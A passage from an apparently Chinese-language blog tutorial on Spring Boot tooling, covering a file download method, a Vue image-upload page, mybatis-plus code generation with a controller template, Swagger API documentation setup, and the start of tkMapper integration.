        <span class="hljs-type">int</span> <span class="hljs-variable">len</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;
        <span class="hljs-comment">// 读取服务器上的图片后 由响应输出流</span>
        <span class="hljs-keyword">while</span>( (len = fileInputStream.read(bytes)) != -<span class="hljs-number">1</span>)&#123;
            outputStream.write(bytes, <span class="hljs-number">0</span>, len);
            outputStream.flush();
        &#125;

    &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;
        e.printStackTrace();
    &#125; <span class="hljs-keyword">finally</span> &#123;
        fileInputStream.close();
        outputStream.close();
    &#125;
&#125;</code></pre>



<h2 id="2-前端页面"><a href="#2-前端页面" class="headerlink" title="2.前端页面"></a>2.前端页面</h2><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">&quot;en&quot;</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">http-equiv</span>=<span class="hljs-string">&quot;X-UA-Compatible&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;IE=edge&quot;</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;viewport&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>文件上传<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span>
  <span class="hljs-comment">&lt;!-- 引入样式 --&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">link</span> <span class="hljs-attr">rel</span>=<span class="hljs-string">&quot;stylesheet&quot;</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;../../plugins/element-ui/index.css&quot;</span> /&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">link</span> <span class="hljs-attr">rel</span>=<span class="hljs-string">&quot;stylesheet&quot;</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;../../styles/common.css&quot;</span> /&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">link</span> <span class="hljs-attr">rel</span>=<span class="hljs-string">&quot;stylesheet&quot;</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;../../styles/page.css&quot;</span> /&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span>
   <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;addBrand-container&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;food-add-app&quot;</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;container&quot;</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">el-upload</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;avatar-uploader&quot;</span></span>
<span class="hljs-tag">                <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;/common/upload&quot;</span></span>
<span class="hljs-tag">                <span class="hljs-attr">:show-file-list</span>=<span class="hljs-string">&quot;false&quot;</span></span>
<span class="hljs-tag">                <span class="hljs-attr">:on-success</span>=<span class="hljs-string">&quot;handleAvatarSuccess&quot;</span></span>
<span class="hljs-tag">                <span class="hljs-attr">:before-upload</span>=<span class="hljs-string">&quot;beforeUpload&quot;</span></span>
<span class="hljs-tag">                <span class="hljs-attr">ref</span>=<span class="hljs-string">&quot;upload&quot;</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">v-if</span>=<span class="hljs-string">&quot;imageUrl&quot;</span> <span class="hljs-attr">:src</span>=<span class="hljs-string">&quot;imageUrl&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;avatar&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">img</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">i</span> <span class="hljs-attr">v-else</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;el-icon-plus avatar-uploader-icon&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">i</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">el-upload</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
    <span class="hljs-comment">&lt;!-- 开发环境版本，包含了有帮助的命令行警告 --&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;../../plugins/vue/vue.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
    <span class="hljs-comment">&lt;!-- 引入组件库 --&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;../../plugins/element-ui/index.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
    <span class="hljs-comment">&lt;!-- 引入axios --&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;../../plugins/axios/axios.min.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;../../js/index.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span>
<span class="language-javascript">      <span class="hljs-keyword">new</span> <span class="hljs-title class_">Vue</span>(&#123;</span>
<span class="language-javascript">        <span class="hljs-attr">el</span>: <span class="hljs-string">&#x27;#food-add-app&#x27;</span>,</span>
<span class="language-javascript">        <span class="hljs-title function_">data</span>(<span class="hljs-params"></span>) &#123;</span>
<span class="language-javascript">          <span class="hljs-keyword">return</span> &#123;</span>
<span class="language-javascript">            <span class="hljs-attr">imageUrl</span>: <span class="hljs-string">&#x27;&#x27;</span></span>
<span class="language-javascript">          &#125;</span>
<span class="language-javascript">        &#125;,</span>
<span class="language-javascript">        <span class="hljs-attr">methods</span>: &#123;</span>
<span class="language-javascript">          handleAvatarSuccess (response, file, fileList) &#123;</span>
<span class="language-javascript">              <span class="hljs-variable language_">this</span>.<span class="hljs-property">imageUrl</span> = <span class="hljs-string">`/common/download?name=<span class="hljs-subst">$&#123;response.data&#125;</span>`</span></span>
<span class="language-javascript">          &#125;,</span>
<span class="language-javascript">          beforeUpload (file) &#123;</span>
<span class="language-javascript">            <span class="hljs-keyword">if</span>(file)&#123;</span>
<span class="language-javascript">              <span class="hljs-keyword">const</span> suffix = file.<span class="hljs-property">name</span>.<span class="hljs-title function_">split</span>(<span class="hljs-string">&#x27;.&#x27;</span>)[<span class="hljs-number">1</span>]</span>
<span class="language-javascript">              <span class="hljs-keyword">const</span> size = file.<span class="hljs-property">size</span> / <span class="hljs-number">1024</span> / <span class="hljs-number">1024</span> &lt; <span class="hljs-number">2</span></span>
<span class="language-javascript">              <span class="hljs-keyword">if</span>([<span class="hljs-string">&#x27;png&#x27;</span>,<span class="hljs-string">&#x27;jpeg&#x27;</span>,<span class="hljs-string">&#x27;jpg&#x27;</span>].<span class="hljs-title function_">indexOf</span>(suffix) &lt; <span class="hljs-number">0</span>)&#123;</span>
<span class="language-javascript">                <span class="hljs-variable language_">this</span>.<span class="hljs-property">$message</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">&#x27;上传图片只支持 png、jpeg、jpg 格式！&#x27;</span>)</span>
<span class="language-javascript">                <span class="hljs-variable language_">this</span>.<span class="hljs-property">$refs</span>.<span class="hljs-property">upload</span>.<span class="hljs-title function_">clearFiles</span>()</span>
<span class="language-javascript">                <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span></span>
<span class="language-javascript">              &#125;</span>
<span class="language-javascript">              <span class="hljs-keyword">if</span>(!size)&#123;</span>
<span class="language-javascript">                <span class="hljs-variable language_">this</span>.<span class="hljs-property">$message</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">&#x27;上传文件大小不能超过 2MB!&#x27;</span>)</span>
<span class="language-javascript">                <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span></span>
<span class="language-javascript">              &#125;</span>
<span class="language-javascript">              <span class="hljs-keyword">return</span> file</span>
<span class="language-javascript">            &#125;</span>
<span class="language-javascript">          &#125;</span>
<span class="language-javascript">        &#125;</span>
<span class="language-javascript">      &#125;)</span>
<span class="language-javascript">    </span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span></code></pre>

<h1 id="mybatis-plus-generator"><a href="#mybatis-plus-generator" class="headerlink" title="mybatis-plus-generator"></a>mybatis-plus-generator</h1><p>MP的代码生成器，可以节约创建文件的时间</p>
<h2 id="1-导入依赖"><a href="#1-导入依赖" class="headerlink" title="1.导入依赖"></a>1.导入依赖</h2><pre><code class="hljs xml"><span class="hljs-comment">&lt;!--代码生成器--&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.baomidou<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>mybatis-plus-generator<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.5.2<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span></code></pre>

<h2 id="2-编写生成器代码"><a href="#2-编写生成器代码" class="headerlink" title="2.编写生成器代码"></a>2.编写生成器代码</h2><p>可以放在专门的工具类包下</p>
<pre><code class="hljs java"><span class="hljs-keyword">package</span> com.sunzy.utils;

<span class="hljs-keyword">import</span> com.baomidou.mybatisplus.generator.FastAutoGenerator;
<span class="hljs-keyword">import</span> com.baomidou.mybatisplus.generator.config.OutputFile;
<span class="hljs-keyword">import</span> com.baomidou.mybatisplus.generator.engine.FreemarkerTemplateEngine;

<span class="hljs-keyword">import</span> java.util.Collections;

<span class="hljs-comment">/**</span>
<span class="hljs-comment"> * mp代码生成器</span>
<span class="hljs-comment"> */</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CodeGenreator</span> &#123;
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;
        generator();
    &#125;

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">generator</span><span class="hljs-params">()</span>&#123;
        FastAutoGenerator.create(<span class="hljs-string">&quot;jdbc:mysql://localhost:3306/admin_demo?serverTimezone=Asia/Shanghai&amp;useUnicode=true&amp;characterEncoding=utf-8&amp;zeroDateTimeBehavior=convertToNull&amp;useSSL=false&amp;allowPublicKeyRetrieval=true&quot;</span>,
                <span class="hljs-string">&quot;username&quot;</span>, <span class="hljs-string">&quot;password&quot;</span>)
                .globalConfig(builder -&gt; &#123;
                    builder.author(<span class="hljs-string">&quot;sunzy&quot;</span>) <span class="hljs-comment">// 设置作者</span>
                            .enableSwagger() <span class="hljs-comment">// 开启 swagger 模式</span>
                            .fileOverride() <span class="hljs-comment">// 覆盖已生成文件</span>
                            .outputDir(<span class="hljs-string">&quot;E:\\Sunzh\\java\\admin_demo\\src\\main\\java\\&quot;</span>); <span class="hljs-comment">// 指定输出目录</span>
                &#125;)
                .packageConfig(builder -&gt; &#123;
                    builder.parent(<span class="hljs-string">&quot;com.sunzy&quot;</span>) <span class="hljs-comment">// 设置父包名</span>
                            .moduleName(<span class="hljs-string">&quot;&quot;</span>) <span class="hljs-comment">// 设置父包模块名</span>
                            .pathInfo(Collections.singletonMap(OutputFile.xml, <span class="hljs-string">&quot;E:\\Sunzh\\java\\admin_demo\\src\\main\\resources\\mapper\\&quot;</span>)); <span class="hljs-comment">// 设置mapperXml生成路径 OutputEile.xml这里可能会报错 根据版本修改</span>
                &#125;)
                .strategyConfig(builder -&gt; &#123;
                    builder.entityBuilder().enableLombok();
                    builder.mapperBuilder().enableMapperAnnotation().build();
                    builder.controllerBuilder().enableHyphenStyle()  <span class="hljs-comment">// 连字符转驼峰</span>
                            .enableRestStyle();  <span class="hljs-comment">// 开启rest控制器</span>
                    builder.addInclude(<span class="hljs-string">&quot;sys_user&quot;</span>) <span class="hljs-comment">// 设置需要生成的表名</span>
                            .addTablePrefix(<span class="hljs-string">&quot;t_&quot;</span>, <span class="hljs-string">&quot;sys_&quot;</span>); <span class="hljs-comment">// 设置过滤表前缀</span>
                &#125;)
<span class="hljs-comment">//                .templateEngine(new FreemarkerTemplateEngine()) // 使用Freemarker引擎模板，默认的是Velocity引擎模板</span>
                .execute();

    &#125;
&#125;
</code></pre>

<p>完成后，直接运行改工具类就可以直接生成以下文件：</p>
<p>UserMapper.java IUserService.java UserServiceImpl.java UserController.java</p>
<h2 id="3-Controller模板"><a href="#3-Controller模板" class="headerlink" title="3.Controller模板"></a>3.Controller模板</h2><p>可以根据需要修改自己的模板</p>
<pre><code class="hljs kotlin"><span class="hljs-keyword">package</span> $&#123;<span class="hljs-keyword">package</span>.Controller&#125;;


<span class="hljs-keyword">import</span> com.baomidou.mybatisplus.extension.plugins.pagination.Page;
<span class="hljs-keyword">import</span> org.springframework.web.bind.<span class="hljs-keyword">annotation</span>.*;
<span class="hljs-keyword">import</span> javax.<span class="hljs-keyword">annotation</span>.Resource;
<span class="hljs-keyword">import</span> java.util.List;
<span class="hljs-keyword">import</span> com.baomidou.mybatisplus.core.conditions.query.QueryWrapper;

<span class="hljs-keyword">import</span> $&#123;<span class="hljs-keyword">package</span>.Service&#125;.$&#123;table.serviceName&#125;;
<span class="hljs-keyword">import</span> $&#123;<span class="hljs-keyword">package</span>.Entity&#125;.$&#123;entity&#125;;

#<span class="hljs-keyword">if</span>($&#123;restControllerStyle&#125;)
<span class="hljs-keyword">import</span> org.springframework.web.bind.<span class="hljs-keyword">annotation</span>.RestController;
#<span class="hljs-keyword">else</span>
<span class="hljs-keyword">import</span> org.springframework.stereotype.Controller;
#end
#<span class="hljs-keyword">if</span>($&#123;superControllerClassPackage&#125;)
<span class="hljs-keyword">import</span> $&#123;superControllerClassPackage&#125;;
#end

<span class="hljs-comment">/**</span>
<span class="hljs-comment"> * &lt;p&gt;</span>
<span class="hljs-comment"> * $!&#123;table.comment&#125; 前端控制器</span>
<span class="hljs-comment"> * &lt;/p&gt;</span>
<span class="hljs-comment"> *</span>
<span class="hljs-comment"> * <span class="hljs-doctag">@author</span> $&#123;author&#125;</span>
<span class="hljs-comment"> * <span class="hljs-doctag">@since</span> $&#123;date&#125;</span>
<span class="hljs-comment"> */</span>
#<span class="hljs-keyword">if</span>($&#123;restControllerStyle&#125;)
<span class="hljs-meta">@RestController</span>
#<span class="hljs-keyword">else</span>
<span class="hljs-meta">@Controller</span>
#end
<span class="hljs-meta">@RequestMapping(<span class="hljs-string">&quot;#if(<span class="hljs-subst">$&#123;package.ModuleName&#125;</span>)/<span class="hljs-subst">$&#123;package.ModuleName&#125;</span>#end/#if(<span class="hljs-subst">$&#123;controllerMappingHyphenStyle&#125;</span>)<span class="hljs-subst">$&#123;controllerMappingHyphen&#125;</span>#else<span class="hljs-subst">$&#123;table.entityPath&#125;</span>#end&quot;</span>)</span>
#<span class="hljs-keyword">if</span>($&#123;kotlin&#125;)
<span class="hljs-keyword">class</span> $&#123;table.controllerName&#125;#<span class="hljs-keyword">if</span>($&#123;superControllerClass&#125;) : $&#123;superControllerClass&#125;()#end

#<span class="hljs-keyword">else</span>
    #<span class="hljs-keyword">if</span>($&#123;superControllerClass&#125;)
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> $&#123;table.controllerName&#125; extends $&#123;superControllerClass&#125; &#123;
    #<span class="hljs-keyword">else</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> $&#123;table.controllerName&#125; &#123;
    #end

<span class="hljs-meta">@Resource</span>
<span class="hljs-keyword">private</span> $&#123;table.serviceName&#125; $&#123;table.entityPath&#125;Service;

<span class="hljs-comment">// 新增或者更新</span>
<span class="hljs-meta">@PostMapping</span>
<span class="hljs-keyword">public</span> boolean save(<span class="hljs-meta">@RequestBody</span> $&#123;entity&#125; $&#123;table.entityPath&#125;) &#123;
        <span class="hljs-keyword">return</span> $&#123;table.entityPath&#125;Service.saveOrUpdate($&#123;table.entityPath&#125;);
&#125;

<span class="hljs-meta">@DeleteMapping(<span class="hljs-string">&quot;/&#123;id&#125;&quot;</span>)</span>
<span class="hljs-keyword">public</span> <span class="hljs-built_in">Boolean</span> delete(<span class="hljs-meta">@PathVariable</span> Integer id) &#123;
        <span class="hljs-keyword">return</span> $&#123;table.entityPath&#125;Service.removeById(id);
&#125;

<span class="hljs-meta">@PostMapping(<span class="hljs-string">&quot;/del/batch&quot;</span>)</span>
<span class="hljs-keyword">public</span> boolean deleteBatch(<span class="hljs-meta">@RequestBody</span> List&lt;Integer&gt; ids) &#123;
        <span class="hljs-keyword">return</span> $&#123;table.entityPath&#125;Service.removeById(ids);
&#125;

<span class="hljs-meta">@GetMapping</span>
<span class="hljs-keyword">public</span> List&lt;$&#123;entity&#125;&gt; findAll() &#123;
        <span class="hljs-keyword">return</span> $&#123;table.entityPath&#125;Service.list();
&#125;

<span class="hljs-meta">@GetMapping(<span class="hljs-string">&quot;/&#123;id&#125;&quot;</span>)</span>
<span class="hljs-keyword">public</span> $&#123;entity&#125; findOne(<span class="hljs-meta">@PathVariable</span> Integer id) &#123;
        <span class="hljs-keyword">return</span> $&#123;table.entityPath&#125;Service.getById(id);
&#125;

<span class="hljs-meta">@GetMapping(<span class="hljs-string">&quot;/page&quot;</span>)</span>
<span class="hljs-keyword">public</span> Page&lt;$&#123;entity&#125;&gt; findPage(<span class="hljs-meta">@RequestParam</span> Integer pageNum,
<span class="hljs-meta">@RequestParam</span> Integer pageSize) &#123;
        LambdaQueryWrapper&lt;$&#123;entity&#125;&gt; queryWrapper = new LambdaQueryWrapper&lt;&gt;();
        queryWrapper.orderByDesc(<span class="hljs-string">&quot;id&quot;</span>);
        <span class="hljs-keyword">return</span> $&#123;table.entityPath&#125;Service.page(new Page&lt;&gt;(pageNum, pageSize), queryWrapper);
	&#125;
&#125;

#end
</code></pre>

<p>更多的模板可以到<code>com.baomidou.mybatis-plus-generator</code>包中复制到项目的<code>resources\templates</code>中，根据自己的需求修改模板</p>
<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220513194907662.png" alt="image-20220513194907662"></p>
<h1 id="Swagger"><a href="#Swagger" class="headerlink" title="Swagger"></a>Swagger</h1><h2 id="1-导入依赖-1"><a href="#1-导入依赖-1" class="headerlink" title="1.导入依赖"></a>1.导入依赖</h2><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>io.springfox<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>springfox-swagger2<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>2.9.2<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>io.springfox<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>springfox-swagger-ui<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>2.9.2<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span></code></pre>



<h2 id="2-创建配置类"><a href="#2-创建配置类" class="headerlink" title="2.创建配置类"></a>2.创建配置类</h2><p>再<code>com.sunzy.fmmall.config.SwaggerConfig</code>路径下创建swagger的配置类</p>
<p>配置文档的封面信息 包括标题，版本，作者信息</p>
<p>修改需要扫面的controller包位置即可</p>
<pre><code class="hljs java"><span class="hljs-keyword">package</span> com.sunzy.fmmall.config;

<span class="hljs-keyword">import</span> org.springframework.context.annotation.Bean;
<span class="hljs-keyword">import</span> org.springframework.context.annotation.Configuration;
<span class="hljs-keyword">import</span> springfox.documentation.builders.ApiInfoBuilder;
<span class="hljs-keyword">import</span> springfox.documentation.builders.PathSelectors;
<span class="hljs-keyword">import</span> springfox.documentation.builders.RequestHandlerSelectors;
<span class="hljs-keyword">import</span> springfox.documentation.service.ApiInfo;
<span class="hljs-keyword">import</span> springfox.documentation.service.Contact;
<span class="hljs-keyword">import</span> springfox.documentation.spi.DocumentationType;
<span class="hljs-keyword">import</span> springfox.documentation.spring.web.plugins.Docket;
<span class="hljs-keyword">import</span> springfox.documentation.swagger2.annotations.EnableSwagger2;

<span class="hljs-meta">@Configuration</span>
<span class="hljs-meta">@EnableSwagger2</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SwaggerConfig</span> &#123;
    <span class="hljs-comment">/**</span>
<span class="hljs-comment">     * swagger可以自动生成接口文档</span>
<span class="hljs-comment">     * 1.配置生成文档的信息</span>
<span class="hljs-comment">     * 2.配置生成规则</span>
<span class="hljs-comment">     *</span>
<span class="hljs-comment">     */</span>

    <span class="hljs-comment">/**</span>
<span class="hljs-comment">     * Docket用来封装接口文档</span>
<span class="hljs-comment">     *</span>
<span class="hljs-comment">     * <span class="hljs-doctag">@return</span></span>
<span class="hljs-comment">     */</span>

    <span class="hljs-meta">@Bean</span>
    <span class="hljs-keyword">public</span> Docket <span class="hljs-title function_">getDocket</span><span class="hljs-params">()</span>&#123;
        <span class="hljs-comment">//创建封面信息对象</span>
        <span class="hljs-type">ApiInfoBuilder</span> <span class="hljs-variable">apiInfoBuilder</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ApiInfoBuilder</span>();
        apiInfoBuilder.title(<span class="hljs-string">&quot;《锋迷商城》后端接口说明&quot;</span>)
                .description(<span class="hljs-string">&quot;此文档详细说明了锋迷商城项目后端接口规范....&quot;</span>)
                .version(<span class="hljs-string">&quot;v 2.0.1&quot;</span>)
                .contact( <span class="hljs-keyword">new</span> <span class="hljs-title class_">Contact</span>(<span class="hljs-string">&quot;sunzy&quot;</span>,<span class="hljs-string">&quot;www.suzny.com&quot;</span>,<span class="hljs-string">&quot;sunzy@wang.com&quot;</span>) );
        <span class="hljs-type">ApiInfo</span> <span class="hljs-variable">apiInfo</span> <span class="hljs-operator">=</span>  apiInfoBuilder.build();

        <span class="hljs-type">Docket</span> <span class="hljs-variable">docket</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Docket</span>(DocumentationType.SWAGGER_2)
                .apiInfo(apiInfo) <span class="hljs-comment">//指定生成的文档中的封面信息：文档标题、版本、作者</span>
                .select()
                .apis(RequestHandlerSelectors.basePackage(<span class="hljs-string">&quot;com.sunzy.fmmall.controller&quot;</span>))
                .paths(PathSelectors.any())
                .build();

        <span class="hljs-keyword">return</span> docket;
    &#125;
&#125;
</code></pre>

<p>启动springboot项目访问项目地址&#x2F;swagger-ui.html即可看到相关接口信息，并可以进行测试</p>
<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220710113522350.png" alt="image-20220710113522350"></p>
<h2 id="3-swagger注解说明"><a href="#3-swagger注解说明" class="headerlink" title="3.swagger注解说明"></a>3.swagger注解说明</h2><blockquote>
<p>Swagger提供一套详细的注解可以对接口进行详细的说明</p>
</blockquote>
<p>@Api 类注解，对控制器类添加此注解可以对控制器进行功能说明</p>
<pre><code class="hljs reasonml">@<span class="hljs-constructor">Api(<span class="hljs-params">value</span> = <span class="hljs-string">&quot;用户管理&quot;</span>, <span class="hljs-params">tags</span> = <span class="hljs-string">&quot;提供用户注册和登录服务&quot;</span>)</span></code></pre>

<p>@ApiOperation 方法注解，对每个方法作用进行详细说明</p>
<pre><code class="hljs kotlin"><span class="hljs-meta">@ApiOperation(<span class="hljs-string">&quot;用户登录接口&quot;</span>)</span></code></pre>

<p>@ApiImplicitParams和@ApiImplicitParam 对方法中的参数进行详细的说明，包括字段名，备注，是否必须，以及默认值</p>
<pre><code class="hljs less"><span class="hljs-variable">@ApiImplicitParams</span>(
        <span class="hljs-variable">@ApiImplicitParam</span>(dataType = <span class="hljs-string">&quot;string&quot;</span>, name = <span class="hljs-string">&quot;username&quot;</span>, value = <span class="hljs-string">&quot;用户账号&quot;</span>, required = true),
        <span class="hljs-variable">@ApiImplicitParam</span>(dataType = <span class="hljs-string">&quot;string&quot;</span>, name = <span class="hljs-string">&quot;password&quot;</span>, value = <span class="hljs-string">&quot;用户密码&quot;</span>, required = true)
)</code></pre>

<p>@ApiModel 当接口参数和返回值类型为对象类型是需要添加此注解</p>
<pre><code class="hljs reasonml">@<span class="hljs-constructor">ApiModel(<span class="hljs-params">value</span> = <span class="hljs-string">&quot;ResultVO对象&quot;</span>,<span class="hljs-params">description</span> = <span class="hljs-string">&quot;封装接口返回给前端的数据&quot;</span>)</span></code></pre>

<p>@ApiModelProperty 模型中的成员变量进行说明</p>
<pre><code class="hljs reasonml">@<span class="hljs-constructor">ApiModelProperty(<span class="hljs-params">value</span> = <span class="hljs-string">&quot;响应状态码&quot;</span>,<span class="hljs-params">dataType</span> = <span class="hljs-string">&quot;int&quot;</span>)</span>
<span class="hljs-keyword">private</span> <span class="hljs-built_in">int</span> code;</code></pre>

<p>@ApiIngnore接口方法注解，添加此注解的方法不会出现在接口文档中</p>
<h2 id="4-swagger-ui插件"><a href="#4-swagger-ui插件" class="headerlink" title="4.swagger-ui插件"></a>4.swagger-ui插件</h2><p>导入插件依赖</p>
<pre><code class="hljs xml"><span class="hljs-comment">&lt;!--swagger-ui插件依赖--&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.github.xiaoymin<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>swagger-bootstrap-ui<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.9.6<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span></code></pre>

<p>访问url:<a href="http://localhost:8080/doc.html">http://localhost:8080/doc.html</a> ,ui界面设计更加美观</p>
<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220710133641781.png" alt="image-20220710133641781"></p>
<h1 id="tkMapper"><a href="#tkMapper" class="headerlink" title="tkMapper"></a>tkMapper</h1><p>整合tkmapper</p>
<h2 id="1-导入依赖-2"><a href="#1-导入依赖-2" class="headerlink" title="1.导入依赖"></a>1.导入依赖</h2><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>tk.mybatis<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>mapper-spring-boot-starter<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>2.1.5<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span></code></pre>



<h2 id="2-配置application-yml文件"><a href="#2-配置application-yml文件" class="headerlink" title="2.配置application.yml文件"></a>2.配置application.yml文件</h2><pre><code class="hljs yaml"><span class="hljs-attr">spring:</span>
  <span class="hljs-attr">datasource:</span>
    <span class="hljs-attr">druid:</span>
      <span class="hljs-attr">driver-class-name:</span> <span class="hljs-string">com.mysql.cj.jdbc.Driver</span>
